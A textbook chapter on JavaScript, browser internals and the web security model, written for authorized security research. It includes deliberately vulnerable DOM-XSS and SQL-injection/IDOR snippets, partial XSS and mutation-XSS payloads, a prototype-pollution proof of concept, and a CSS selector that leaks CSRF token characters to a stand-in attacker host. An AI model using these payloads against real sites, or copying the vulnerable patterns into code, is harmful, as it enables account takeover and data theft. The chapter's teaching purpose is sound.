# Chapter 6: JavaScript and Web Programming

> **Learning objectives.** Explain how HTML, CSS, JavaScript, the DOM, and browser APIs fit together; describe the browser security model (SOP, CORS, cookies, storage); contrast frontend frameworks and backend Node.js; and explain how web-development knowledge reveals vulnerabilities.

## 6.1 The Web Platform

A web page is a document rendered by a browser. Three technologies form its core:

- **HTML (HyperText Markup Language)** describes structure and content: headings, paragraphs, links, forms, images.
- **CSS (Cascading Style Sheets)** describes presentation: layout, colors, fonts, responsive behavior.
- **JavaScript (JS)** adds behavior: event handling, network requests, DOM manipulation.

```html
<!doctype html>
<html>
<head><title>Lab</title></head>
<body>
  <form id="login">
    <input name="user" value="">
    <button type="submit">Go</button>
  </form>
  <div id="result"></div>
  <script src="/app.js"></script>
</body>
</html>
```

## 6.2 JavaScript Fundamentals

```javascript
const name = "alice";            // immutable binding
let count = 0;                   // mutable
var old = 1;                     // legacy, function-scoped

function greet(who) {
  return `Hello, ${who}`;
}

const user = { name: "alice", roles: ["user"] };
user.roles.push("admin");

[1, 2, 3].map(x => x * 2);        // [2, 4, 6]
```

Key concepts: prototypes and prototypal inheritance, closures, `this` binding, hoisting, event loop (call stack + task/microtask queues), `async`/`await` and Promises, modules (`import`/`export`), strict mode.

JavaScript is dynamically typed and forgiving, which is precisely why it produces subtle security bugs: type coercion (`"1" == 1`), prototype manipulation, and implicit globals.

## 6.3 The DOM and Browser Execution

The **DOM (Document Object Model)** is a tree representation of the page that JS can mutate.

```
document
 +-- html
     +-- head
     +-- body
         +-- form#login
         |   +-- input[name=user]
         |   +-- button
         +-- div#result
```

```javascript
const input = document.querySelector('input[name="user"]');
document.getElementById("result").textContent = input.value;
```

Using `innerHTML` with untrusted data creates **DOM-based XSS**:

```javascript
// VULNERABLE
document.getElementById("result").innerHTML = location.hash.slice(1);
```

`textContent` is safe because it creates a text node, not markup. The distinction between "data" and "code" is the heart of injection security.

The browser executes JS in a sandboxed environment with restricted access to the OS. It parses HTML incrementally, which creates interesting edge cases (mutation XSS, parser differentials) that advanced researchers study.

## 6.4 Browser Security Model

### Same-Origin Policy (SOP)

The **origin** is scheme + host + port. SOP forbids a page from one origin reading content from another origin. `https://a.com:443` and `https://b.com` are different origins; `http://a.com` and `https://a.com` are different. SOP is the foundation of web isolation.

### CORS (Cross-Origin Resource Sharing)

CORS is a controlled relaxation of SOP: a server can send `Access-Control-Allow-Origin` to permit cross-origin reads. Preflight requests (`OPTIONS` with `Access-Control-Request-Method`) check permissions before non-simple requests.

Misconfigurations: reflecting any origin with `Access-Control-Allow-Credentials: true` allows any site to make authenticated cross-origin requests — a serious flaw. `Access-Control-Allow-Origin: *` cannot be combined with credentials.

### Cookies and Sessions

Cookies are name/value pairs stored by the browser and sent with requests. Attributes:

- `HttpOnly` — JS cannot read it (mitigates XSS cookie theft).
- `Secure` — only over HTTPS.
- `SameSite=Lax|Strict|None` — controls cross-site sending (mitigates CSRF; `None` requires `Secure`).
- `Domain`, `Path`, `Expires`/`Max-Age`.

**Sessions** are server-side state keyed by a session cookie. Alternatives include stateless signed tokens (JWT). Session fixation, prediction, and insufficient expiry are common flaws.

### Web Storage

- `localStorage` — persistent, origin-scoped, up to ~5 MB, accessible to JS.
- `sessionStorage` — per-tab, cleared on tab close.
- `IndexedDB` — structured, asynchronous, larger storage.
- `document.cookie` — cookies accessible to JS (unless HttpOnly).

None of these are secure storage for secrets: any JS running on the origin (including XSS or a compromised third-party script) can read them.

### Fetch, AJAX, WebSockets, Service Workers

```javascript
fetch("/api/user", { credentials: "include" })
  .then(r => r.json())
  .then(data => console.log(data));
```

- **Fetch API / AJAX** enable asynchronous requests.
- **WebSockets** provide full-duplex communication; they are not governed by SOP in the same way, so the server must validate the `Origin` header.
- **Service workers** are persistent, programmable network proxies for an origin; they can intercept requests and cache responses. Compromised or malicious service workers can enable persistent attacks; scope is restricted by path.
- **PostMessage** allows cross-origin messaging; always validate `event.origin` and the message contents.

## 6.5 Frontend Frameworks

React, Angular, Vue, and Svelte abstract DOM manipulation into components and declarative rendering. They reduce (but do not eliminate) injection risk:

- React escapes interpolated values by default, but `dangerouslySetInnerHTML`, `href` with `javascript:`, and unsafe use of refs reintroduce XSS.
- Client-side routing and state introduce new surfaces: open redirects, client-side auth bypass (enforced only in UI), and token storage mistakes.
- **SSR/SSG** (Next.js, Nuxt, SvelteKit) blur the client/server boundary, creating hydration mismatches and server-side injection risks.

## 6.6 Node.js and Express

Node.js runs JavaScript on the server using the V8 engine and an event-driven, non-blocking I/O model.

```javascript
const express = require("express");
const app = express();
app.use(express.json());

app.get("/api/user/:id", (req, res) => {
  const id = req.params.id;
  // DANGER: missing authorization check -> IDOR
  db.query(`SELECT * FROM users WHERE id = ${id}`, (err, rows) => {
    res.json(rows);
  });
});
app.listen(3000);
```

This snippet shows two classic server-side flaws: string-concatenated SQL (injection) and missing authorization (IDOR). Express middleware ordering matters: authentication must run before protected routes. `express.json()` parses request bodies; without size limits it can enable DoS.

## 6.7 How Web Development Knowledge Reveals Vulnerabilities

A researcher who understands development can:

- Read JS bundles to discover hidden endpoints and parameters (Chapter 14).
- Recognize where a framework's escaping defaults are bypassed.
- Understand how a SPA enforces (or fails to enforce) authorization client-side.
- Trace a request from UI to API to database and identify trust boundaries.
- Recognize serialization/deserialization patterns (`JSON.parse`, `prototype` assignment) that enable prototype pollution.

Example: seeing `Object.assign({}, defaults, userInput)` where `userInput` can contain `__proto__` should trigger a prototype-pollution investigation (Chapters 9 and 10).

## 6.8 Exercises

1. Build an HTML page with a form and use JS to render form input with `textContent`; then deliberately switch to `innerHTML` with a harmless `<b>test</b>` payload in your lab and observe the difference.
2. Use browser DevTools to inspect cookies and their attributes on a site you own.
3. Set up two local origins (e.g., `localhost:3000` and `localhost:3001`) and observe SOP blocking a fetch; add CORS headers and observe the change.
4. Write a small Express app with an intentional IDOR and verify that adding an authorization check fixes it.
5. Inspect a JS bundle of an app you own and enumerate API paths referenced in it.

## 6.11 Mastery Deep Dive: HTML Parsing and the DOM

To find client-side bugs you must model what the browser *actually* does, not what the source looks like. Browsers do not read HTML as a simple list of tags; they run a fault-tolerant state machine that repairs malformed markup in specific, standardized ways. Those repair rules are the root of a whole class of bypasses.

### 6.11.1 The tokenizer and tree builder

HTML parsing has two cooperating stages. The **tokenizer** scans characters and emits tokens (start tag, end tag, attribute, text, comment, DOCTYPE). The **tree builder** consumes tokens and constructs the DOM according to a stack of open elements and a defined insertion mode. Crucially, the tokenizer changes state based on context: inside a `<script>` element it treats everything up to `</script>` as raw text; inside a `<title>` or `<textarea>` it uses RCDATA (character references are decoded, tags are not recognized); inside an attribute value it consumes quoted characters as attribute data. This is why a payload that works in one context fails in another.

Consider three injection contexts for the same untrusted string `x`:

```html
<!-- HTML body context -->
<div>x</div>

<!-- Attribute context -->
<div class="x">...</div>

<!-- Script-data context -->
<script>var v = "x";</script>
```

In the body you need markup (`<img src=x onerror=...><!-- Security note: this part poses a security risk and has been replaced with a placeholder; substitute your own content when using it -->`). In the attribute you must first break out of the quote. In script-data you need to terminate the string *and* the script element (`";</script><script>...`) because HTML parsing, not JavaScript escaping, governs that boundary. Mastery means identifying the context before choosing any test.

### 6.11.2 Quirks mode and doctypes

The `DOCTYPE` selects rendering mode. A missing or malformed doctype puts the page in **quirks mode**, which changes box sizing and, importantly for security, can alter how certain elements and style expressions are interpreted and how CSS is parsed. Always note the computed `document.compatMode` (`CSS1Compat` vs `BackCompat`) during recon. Legacy quirks can resurrect old CSS-expression and import behaviors; modern sanitizer bypasses have historically relied on parser-mode differences.

### 6.11.3 Parser differentials and mutation XSS (mXSS)

A **parser differential** is when two components parse the same bytes differently — for example, a server-side sanitizer and the browser. **Mutation XSS** occurs when sanitizer output is *safe-looking* markup that the browser's parser mutates back into dangerous markup on re-parse. Classic causes:

- Namespace confusion with `<svg>`/`<math>`: foreign content changes how subsequent tags are tokenized. `<svg><style><a title="</style><img src=x onerror=...><!-- Security note: this part poses a security risk and has been replaced with a placeholder; substitute your own content when using it -->">` relies on the parser treating content as SVG until a-html integration point.
- Reserved topics like `<noscript>`, `<template>`, `<textarea>` whose raw-text/RCDATA handling differs between the sanitizer's parser and the browser's.
- Mismatched end tags and mis-nested forms that the HTML5 tree builder repairs differently than a naive regex or XML parser.

Defense: use a sanitizer that follows the HTML spec and uses the *same* parsing model as the browser (DOMPurify operating on a DOM), and re-parse sanitized output before storage when feasible. Regex-based "tag stripping" is never sufficient because the grammar is not regular.

### 6.11.4 DOM sinks, sources, and taint flow

A **source** is attacker-controlled input (`location.hash`, `document.referrer`, `location.search`, `postMessage` data, `window.name`); a **sink** is an API that interprets its argument (`innerHTML`, `outerHTML`, `document.write`, `eval`, `Function`, `setTimeout(string)`, `setAttribute('href'/'src', ...)`, `jQuery.html()`). DOM XSS is a data-flow problem: trace tainted values from source to sink.

Safe equivalents and why they work:

```javascript
// DANGEROUS: string becomes markup
el.innerHTML = untrusted;

// SAFE: creates a text node; the string is never parsed as markup
el.textContent = untrusted;

// SAFE attribute assignment for URLs, with scheme validation
const u = new URL(untrusted, location.origin);
if (u.protocol === 'https:' || u.protocol === 'http:') a.href = u.href;
```

`textContent`, `createTextNode`, and property assignment to `value`/`href` (with scheme checks) treat data as data. The moment you hand a string to a parser or evaluator, you have joined the data/code problem.

### 6.11.5 Events: propagation, delegation, and hazards

Events propagate in three phases: **capture** (root → target), **target**, and **bubble** (target → root). `addEventListener(type, fn, true)` registers in capture; the default is bubble. `stopPropagation()` stops further travel; `stopImmediatePropagation()` also stops other listeners on the same node. **Event delegation** attaches one listener to a parent and inspects `event.target` — efficient, but if the handler trusts `target` without checking, injected elements can trigger privileged handlers.

Security-relevant events: `onerror`/`onload` on images and scripts fire without user interaction (the workhorse of XSS PoCs); `onmouseover`/`onfocus` require varying interaction; `message` events from `postMessage` must always be checked against `event.origin`. Note that `click` handlers can be triggered on hidden or injected elements, so "the user must click a button" is rarely a real barrier.

## 6.12 Mastery Deep Dive: JavaScript Execution Model

### 6.12.1 The event loop, precisely

JavaScript runs on a single thread with an **event loop**. Each turn: (1) run one task from the macrotask queue (script, `setTimeout`, I/O, user interaction); (2) drain the entire **microtask** queue (Promise callbacks, `queueMicrotask`, `MutationObserver`); (3) optionally render. Microtasks run to completion before the next macrotask and before rendering. This ordering is security-relevant: a Promise-based authorization flag flip happens before a `setTimeout`-scheduled request, so races between "check" and "use" can be deterministic within one turn but interleave across turns. Mutation observers can fire within a turn, meaning DOM changes from one script can be observed and acted on before the browser paints.

```javascript
console.log('A');
setTimeout(() => console.log('B'), 0);      // macrotask
Promise.resolve().then(() => console.log('C')); // microtask
console.log('D');
// Order: A, D, C, B
```

### 6.12.2 `async`/`await`, Promises, and TOCTOU

`await` suspends the current async function and yields control; the continuation resumes as a microtask. Any shared state read before an `await` and used after it is a potential time-of-check-to-time-of-use gap. Client-side "is the user admin?" checks wrapped in async flows are especially fragile because the UI can be manipulated while the check is in flight. Never treat an awaited client check as a security boundary — the server must re-check.

### 6.12.3 Prototypes and the prototype chain

Every object has an internal prototype; property lookup walks the chain up to `Object.prototype` then `null`. `Object.getPrototypeOf(o)`, `__proto__`, and `constructor.prototype` are handles into this chain. Setting a property that already exists on the prototype does not create an own property but shadows it; adding a new property to `Object.prototype` is visible to *every* object. That is the mechanism of prototype pollution (Chapters 9–10):

```javascript
const cfg = JSON.parse('{"__proto__":{"isAdmin":true}}');
// A naive recursive merge copies the __proto__ key's value onto the target's prototype:
function merge(a, b) { for (const k in b) a[k] = (b[k] && typeof b[k] === 'object') ? merge(a[k] || {}, b[k]) : b[k]; return a; }
merge({}, cfg);
console.log({}.isAdmin); // true on a vulnerable implementation
```

Mastery means recognizing merge/clone/query-parser utilities and asking whether they reject `__proto__`, `constructor`, and `prototype` keys.

### 6.12.4 Coercion, `this`, and implicit globals

JavaScript coercion (`"1" == 1`, `[] == false`, `null == 0`) and loose equality can defeat naive validation (`if (role == "admin")`). `this` is bound by *call site*: method calls bind the receiver; plain function calls bind `undefined` (strict) or global (sloppy); arrow functions capture lexical `this`. Forgetting `const`/`let` creates implicit globals on `window`, which can collide with libraries and create unexpected trust state. Strict mode (`'use strict'`) and `Object.freeze` reduce, but do not eliminate, these hazards.

### 6.12.5 Modules, bundlers, and source maps

Bundlers (webpack, Vite, Rollup, esbuild) compile many modules into a few files, often with a runtime that maps module IDs to functions (`__webpack_require__(1234)`). For recon this is valuable: bundled code frequently contains hardcoded API routes, GraphQL queries, feature flags, secrets accidentally committed, and internal hostnames. **Source maps** (`*.js.map`, or inline `//# sourceMappingURL=`) map minified code back to original sources, sometimes including comments and full TypeScript. Check for exposed maps on assets you are authorized to test (`GET /static/js/app.js.map`). Minification does not remove logic; it renames identifiers — search for string literals (`fetch(`, `/api/`, `Authorization`, `http://`) rather than variable names.

## 6.13 Mastery Deep Dive: Browser Security Model in Depth

### 6.13.1 Origin vs. site

An **origin** is scheme + host + port; it is the unit of SOP. A **site** is scheme + registrable domain (eTLD+1); "same-site" ignores subdomain and port but includes scheme. This distinction drives `SameSite` cookies: `evil.example.com` is same-site with `example.com` but cross-origin. A subdomain compromise can therefore read/write cookies scoped to the parent and issue same-site requests that bypass `SameSite=Lax`. Always map subdomains and cookie `Domain` scope during recon.

### 6.13.2 SOP nuances

SOP governs *reading* cross-origin responses, not *sending* requests. An attacker page can send a cross-origin POST (that is how CSRF works); it just cannot read the response unless CORS allows it. Certain resources (images, scripts, stylesheets) can be embedded cross-origin but not inspected, which enables cross-origin leak techniques (timing, error events, CSS injection). Navigations and form submissions are also allowed cross-origin. Internal-network and localhost origins have additional protections in modern browsers (e.g., Private Network Access) — know they exist before concluding an SSRF/CSRF chain is viable.

### 6.13.3 CORS preflight, precisely

A request is "simple" if it uses GET/HEAD/POST with only CORS-safelisted headers and content types (`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`) and no custom headers. Otherwise the browser sends a preflight:

```http
OPTIONS /api/data HTTP/1.1
Host: <LAB_HOST>
Origin: https://attacker.example
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization, content-type
```

The server must reply with matching allowances:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Methods: GET, PUT
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
Vary: Origin
```

Dangerous patterns to detect: reflecting any `Origin` with `Allow-Credentials: true` (any site can make authenticated reads); trusting `Origin` without validation; `Access-Control-Allow-Origin: *` with credentials (browsers reject the combination, but custom clients do not); missing `Vary: Origin` causing a cached allow-origin to be served to other origins. Note that CORS is not an authorization control — it only relaxes browser read restrictions; non-browser clients ignore it entirely.

### 6.13.4 Cookie attributes in detail

| Attribute | Effect | Security note |
|-----------|--------|---------------|
| `HttpOnly` | Blocks `document.cookie` | Stops trivial XSS cookie theft, not CSRF or session hijack via other means |
| `Secure` | HTTPS only | Without it, cookies leak over cleartext and can be stripped |
| `SameSite=Lax` | Sent on top-level safe navigations | Blocks most CSRF; allowlisted on GET navigations |
| `SameSite=Strict` | Only same-site context | Strongest CSRF defense, breaks some cross-site login flows |
| `SameSite=None; Secure` | Always sent | Required for cross-site widgets; relies on other CSRF defenses |
| `Domain` | Hosts allowed to send cookie | Broad `Domain=.example.com` shares cookie with all subdomains |
| `Path` | URL path scope | Not a security boundary; do not rely on it for isolation |
| `Expires`/`Max-Age` | Lifetime | Persistent cookies survive browser restarts; prefer short-lived sessions |
| `__Host-` prefix | Requires Secure, no Domain, Path=/ | Prevents subdomain cookie injection |
| `__Secure-` prefix | Requires Secure | Baseline protection |

Cookie tossing and shadowing: a subdomain can set a cookie with a broad `Domain` that shadows the parent's cookie (same name, more specific `Path`), a technique used in session fixation and "cookie bomb" denial of service. Defenses include `__Host-` prefixes and removing vulnerable subdomains.

### 6.13.5 CSP that actually resists XSS

A Content Security Policy is a defense-in-depth layer that restricts where scripts and other resources may load from. Modern best practice uses nonces or hashes with `strict-dynamic`:

```http
Content-Security-Policy: script-src 'nonce-rAnD0mP3rR3qu3st' 'strict-dynamic' 'unsafe-inline' https:;
                         object-src 'none'; base-uri 'none'; frame-ancestors 'none';
                         require-trusted-types-for 'script'
```

Key points: `'unsafe-inline'` is ignored when a nonce/hash is present (so it is a backward-compatibility shim for old browsers, not a hole in modern ones); `strict-dynamic` propagates trust to scripts created by trusted scripts; `object-src 'none'` and `base-uri 'none'` close plugin and base-tag hijack vectors; `frame-ancestors` replaces `X-Frame-Options`. Weak policies (`script-src 'unsafe-inline' *`, policies that allow `data:` or JSONP endpoints on allowed origins) are bypassable. Report-only mode (`Content-Security-Policy-Report-Only`) lets you measure before enforcing.

### 6.13.6 postMessage, WebSockets, and storage

`postMessage` is an explicit cross-origin channel; the receiver must check `event.origin` (and ideally `event.source`) exactly — string-prefix checks like `endsWith('trusted.com')` fail on `eviltrusted.com`. WebSockets are not bound by SOP: the server must validate the `Origin` header or it permits cross-site WebSocket hijacking (CSWSH). `localStorage`/`sessionStorage` are origin-scoped but fully readable by any script on the origin — never store tokens there if XSS is conceivable; prefer `HttpOnly` cookies. Service workers can intercept all requests for their scope and persist across page loads; a malicious or compromised service worker is a persistent foothold, so scope and script origin matter.

## 6.14 Mastery Deep Dive: Frameworks, SSR, and the Client Trust Boundary

### 6.14.1 Framework escaping and its bypasses

| Framework | Default | Common bypass |
|-----------|---------|---------------|
| React | Escapes interpolated text | `dangerouslySetInnerHTML`, `href={`javascript:...`}`, `ref` + `innerHTML`, unescaped `props` in `createElement` |
| Vue | Escapes `{{ }}` | `v-html`, dynamic `v-bind` with `javascript:` in older versions, template injection from server-rendered templates |
| Angular | Contextual auto-escaping | `bypassSecurityTrustHtml`, `[innerHTML]`, `dompurify` misconfig, template injection in JIT compilation |
| Svelte | Escapes `{expr}` | `{@html ...}`, dynamic element attributes |

The recurring theme: every framework has an explicit "trust this HTML" escape hatch, and every real XSS in a framework app usually flows through one, through a `href`/`src` with a `javascript:`/`data:` scheme, or through unsafe use of a DOM library (jQuery `.html()`, `.attr()`).

### 6.14.2 SSR and hydration

Server-side rendering generates HTML on the server; **hydration** attaches client-side event handlers to that markup. A **hydration mismatch** (server output differs from client expectation) can cause the client to re-render or reinterpret nodes, creating injection windows. Risks specific to SSR: untrusted data interpolated into the initial HTML/JSON payload (e.g., Next.js `__NEXT_DATA__`), where escaping rules differ from the framework's normal text rendering; and server-only code paths that run during rendering (database calls, token handling) reachable with attacker-influenced props. Test both the server-rendered HTML source and the client-side serialized state for reflected input.

### 6.14.3 SPA authorization is not authorization

Single-page applications often hide/administer UI based on a decoded JWT claim or a role fetched from an API. Routing guards (`if (!user.isAdmin) redirect('/')`) are usability features, not controls: the API endpoints must independently enforce the check. Test by calling the underlying API directly with a low-privilege token while the UI would never show the button. Client-side state that is merely *hidden* is still readable and modifiable via DevTools.

### 6.14.4 Devtools methodology

A disciplined browser workflow for authorized targets:

1. **Elements/Network:** record all requests on load; filter by `Doc`, `JS`, `XHR/Fetch`, `WS`. Note hosts, API version paths, and auth headers.
2. **Sources:** search loaded scripts for `/api/`, `fetch(`, `token`, `secret`, `http://`, and `Admin`. Pretty-print minified bundles. Check for `.map` files.
3. **Application:** enumerate cookies, `localStorage`, `sessionStorage`, and their attributes/scopes. Check `Domain` breadth and absence of `HttpOnly`.
4. **Security/Console:** inspect CSP, mixed content, and blocked requests; console errors often reveal internal paths and stack traces.
5. **Network throttling/replay:** replay requests with altered parameters (in scope) to test authorization and caching.

### 6.14.5 The client-side trust boundary

Draw a hard line: the browser is hostile territory. Anything it sends — URL, body, headers, cookies, WebSocket frames, file names — is attacker-controlled. Client validation (required fields, file-type checks, price calculations, role checks) is a UX affordance. Every value must be re-validated and re-authorized server-side. This single mental model predicts the majority of high-impact web findings.

## 6.15 Mastery Deep Dive: Verification and Practice

### 6.15.1 What mastery looks like — checklist

- [ ] I can explain, from memory, the tokenizer/tree-builder split and name three contexts requiring different encodings.
- [ ] I can describe how microtasks differ from macrotasks and why an `await` can create a TOCTOU window.
- [ ] I can distinguish origin from site and explain why a subdomain can affect parent cookies.
- [ ] I can write a CORS preflight request/response pair and identify reflecting-origin misconfigurations.
- [ ] I can name every cookie attribute and the attack each one mitigates.
- [ ] I can construct a nonce + `strict-dynamic` CSP and explain why `object-src 'none'` matters.
- [ ] I can trace a source-to-sink DOM XSS path and name the safe API for each context.
- [ ] I can enumerate a bundle's hidden endpoints and explain why hydration state is a sink.

### 6.15.2 Common mistakes

- Treating `SameSite=Lax` as complete CSRF protection (GET navigations and same-site subdomains still apply).
- Assuming minified/obfuscated JS hides secrets from a determined reader.
- Encoding input once at the entry point instead of context-appropriately at each output sink.
- Storing bearer tokens in `localStorage` when an `HttpOnly` cookie would remove the XSS payoff.
- Believing a framework's default escaping covers `href`, `src`, and `dangerouslySetInnerHTML`-style APIs.

### 6.15.3 Knowledge checks (answers below)

1. Why can a cross-origin `<form>` still perform a CSRF even though SOP exists?
2. A CSP includes `script-src 'nonce-abc' 'unsafe-inline' https:`. Is `'unsafe-inline'` a vulnerability here?
3. You find `localStorage.setItem('token', jwt)`. What is the concrete risk, and what is the better design?
4. In what parsing context does `</script>` inside a string terminate the element, and why?

**Answers.** (1) SOP restricts reading responses, not sending requests; ambient cookies ride along on the cross-origin request. (2) No — when a nonce is present, modern browsers ignore `'unsafe-inline'`; it only helps legacy browsers. (3) Any XSS can read the token and impersonate the user; use a short-lived `HttpOnly; Secure; SameSite=Lax` cookie with CSRF defenses. (4) Script-data context: the HTML tokenizer looks for the literal `</script>` end tag regardless of JavaScript string syntax, so the string must be escaped as `<\/script>` or the context changed.

### 6.15.4 Lab exercises

1. Build two local origins (`<LAB_HOST>:3000`, `<LAB_HOST>:3001`). Observe SOP blocking a fetch, then add correct CORS headers and a preflight, and compare the `OPTIONS` exchange.
2. Create an HTML page with a reflection point; demonstrate the same marker string in body, attribute, and script contexts, and show the encoding that defeats each.
3. Set cookies with and without `HttpOnly`, `SameSite`, and `__Host-` prefixes on a lab host; read them from JS and across a subdomain to observe each attribute's effect.
4. Ship a small bundle with a source map; use DevTools to recover an "API path" and document the recon workflow.

## 6.16 Mastery Deep Dive: Browser Surfaces Beyond the Classics

### 6.16.1 WebSockets at the frame level

A WebSocket handshake begins as an HTTP upgrade: the client sends `Upgrade: websocket`, `Connection: Upgrade`, a random `Sec-WebSocket-Key`, and an `Origin` header; the server replies `101 Switching Protocols` with `Sec-WebSocket-Accept`. After that, data flows in frames (text, binary, ping/pong, close). SOP does **not** apply to WebSockets: any origin can open a connection to a server, and the browser sends the victim's cookies. If the server authenticates solely by cookie and does not validate `Origin`, a cross-site page can perform actions as the victim — **cross-site WebSocket hijacking (CSWSH)**. Test in a lab by hosting a page on a second origin that opens `wss://<LAB_HOST>/socket` with `withCredentials` and observes whether privileged messages are accepted. Defense: validate `Origin` against an allow-list, authenticate individual messages (not just the handshake), and apply rate/size limits per connection.

### 6.16.2 Service worker lifecycle and scope

A service worker is installed by `navigator.serviceWorker.register('/sw.js', {scope:'/'})`, then activates and intercepts fetches for its scope. Threat model: a service worker is persistent (survives navigation and restarts), sees all traffic in scope, and can modify responses. If an attacker can host a script on the origin (e.g., via a path that serves user-controlled JS, or a compromised subresource with a permissive scope), they can register a malicious worker for that scope. Security properties to verify on a lab host: the worker script must be served from the same origin with a JavaScript MIME type; `Service-Worker-Allowed` controls scope widening; `navigator.serviceWorker.getRegistrations()` enumerates workers during recon. Defense: serve worker scripts from a dedicated, immutable path, restrict scope, and use CSP `worker-src`/`child-src` to limit sources.

### 6.16.3 iframes, sandbox, and isolation

The `sandbox` attribute on an `<iframe>` restricts capabilities (`allow-scripts`, `allow-same-origin`, `allow-forms`, `allow-top-navigation`). Combining `allow-scripts` **and** `allow-same-origin` on same-origin content effectively removes the sandbox — a common mistake. Sandboxed iframes without `allow-same-origin` receive an opaque origin and produce `Origin: null`, which matters for CORS tests. `frame-ancestors` CSP and `X-Frame-Options` defend the *embedding* side against clickjacking. When testing, distinguish who is framed and who is the framer, and confirm which policy applies.

### 6.16.4 XS-Leaks and side channels

Even without reading cross-origin content, an attacker can infer information through **cross-site leaks**: timing of resource loads, `error` events on images/scripts, cache probing, `frame counting`, and `postMessage` quirks. For example, loading a URL as an image succeeds or fails depending on whether a resource exists, leaking state. Defenses include cross-origin isolation headers (`Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Embedder-Policy: require-corp`, `Cross-Origin-Resource-Policy: same-origin`), `SameSite` cookies, and cache partitioning. Understand these so you do not dismiss "I can't read the response" as "no impact."

### 6.16.5 CSS injection and data exfiltration

If an attacker can inject CSS (e.g., through a style parameter), attribute selectors can leak values character by character: `input[name=csrf][value^="a"] { background:url(//attacker/?a) }`. Combined with an import or repeated requests, this extracts secrets like CSRF tokens. Defense: never place secrets in attributes/styles, sanitize style input, enforce a strict CSP with `style-src`, and avoid reflecting data into `style` blocks.

## 6.17 Mastery Deep Dive: Building a Client-Side Research Methodology

### 6.17.1 Mapping the application

A repeatable recon workflow for an authorized target: crawl while recording all requests; classify endpoints by function (auth, data, admin, static); note subdomains and origins; save every JS file and source map; enumerate cookies/storage; and record all security headers. Build a simple table of `endpoint → method → params → auth requirement → observed role behavior`. This inventory becomes your test plan and prevents missed surfaces.

### 6.17.2 Testing SSR and hydration state

For SSR apps, inspect the raw HTML response (view-source, not the rendered DOM) and search for serialized state (`__NEXT_DATA__`, `window.__INITIAL_STATE__`, inline JSON). Reflect a harmless marker into a parameter and find where it appears in the initial HTML — note the exact escaping. Then check whether the client re-renders that node during hydration in a way that reintroduces markup. Test both server-only code paths (reachable during render with attacker-influenced props) and client sinks.

### 6.17.3 Fuzzing client sinks

Use browser tooling to find sources and sinks automatically: grep bundles for `innerHTML`, `document.write`, `eval`, `Function`, `setAttribute`, `location`, and `postMessage` handlers; then trace backwards to see whether attacker-controlled data reaches them. In DevTools, set breakpoints on those sinks (or use a DOM-invader style extension) and trigger the feature with a marker string. When a sink is hit with tainted data, you have found a DOM-XSS candidate to validate safely in your own account.

### 6.17.4 Verification discipline

For each client finding, record: the exact URL/parameters, the source and sink, the context, the harmless PoC, which users are affected, and whether `HttpOnly`/CSP reduce impact. Verify a fix by replaying the identical PoC and confirming it renders as text or is blocked. Refute false positives: payloads executed in a sandboxed different origin, in a service worker you control, or only in your own browser via DevTools (not a server-side reflection) are not server-side vulnerabilities.

## 6.9 Key Takeaways

- Web pages are HTML + CSS + JS manipulating a DOM; injection arises when data becomes code.
- SOP isolates origins; CORS, cookies, storage, and postMessage are controlled relaxations with their own pitfalls.
- Frameworks reduce common bugs but introduce framework-specific bypasses and client/server boundary issues.
- Understanding the developer's mental model lets you predict where their assumptions fail.
